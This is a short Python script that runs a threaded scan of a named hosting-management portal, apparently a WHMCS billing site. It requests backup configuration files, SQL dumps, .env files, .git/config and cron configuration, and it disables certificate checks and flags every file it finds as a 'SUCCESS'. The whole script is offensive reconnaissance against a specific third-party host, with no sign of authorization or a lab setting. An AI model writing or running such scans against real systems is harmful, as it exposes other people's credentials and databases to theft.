import requests
import concurrent.futures

TARGET = "https://manage.edisglobal.com"
PATHS = [
    "configuration.php.bak", "configuration.php.old", "configuration.php.save",
    "db.sql", "whmcs.sql", "backup.sql", "backup.zip", ".env", ".git/config",
    "admin/login.php", "crons/config.php", "downloads/data.zip"
]

def probe(p):
    url = f"{TARGET}/{p}"
    try:
        r = requests.get(url, verify=False, timeout=5)
        if r.status_code == 200 and len(r.content) > 0:
            print(f"[!!!] SUCCESS: {url} | Size: {len(r.content)}")
            return url
    except:
        pass
    return None

if __name__ == "__main__":
    print(f"[*] Fuzzing Management Portal: {TARGET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        list(executor.map(probe, PATHS))
